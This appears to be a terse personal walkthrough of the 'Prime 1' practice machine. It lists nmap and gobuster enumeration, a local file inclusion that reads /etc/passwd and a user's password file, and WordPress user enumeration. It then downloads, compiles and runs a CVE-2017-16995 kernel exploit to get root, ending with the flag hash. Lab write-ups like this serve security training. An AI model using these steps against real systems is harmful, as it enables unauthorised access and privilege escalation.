----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Prime 1
# 29/12/2022

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

----------------------------------------------------
web(gobuster)
----------------------------------------------------
gobuster dir -u http://10.0.2.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt

http://10.0.2.24/index.php?file=location.txt
Do something better
ok well Now you reah at the exact parameter
Now dig some more for next one
use 'secrettier360' parameter on some other php page for more fun. 
http://10.0.2.24/image.php?secrettier360=/etc/passwd
http://10.0.2.24/image.php?secrettier360=/home/saket/password.txt
follow_the_ippsec 
wpscan --url http://10.0.2.48/wordpress/ --enumerate vt,vp,u
got username victor

http://10.0.2.24/wordpress/wp-login.php
http://10.0.2.48/wordpress/wp-content/themes/twentynineteen/secret.php
----------------------------------------------------
Previlege escalation
----------------------------------------------------
uname -r
4.10.0-28-generic


cd tmp
wget https://github.com/kkamagui/linux-kernel-exploits/blob/master/kernel-4.10.0-28-generic/CVE-2017-16995/CVE-2017-16995.c

gcc CVE-2017–16995.c -o exploit
./exploit

you got root

----------------------------------------------------
Flag
----------------------------------------------------

cat root.txt
b2b17036da1de94cfb024540a8e7075a
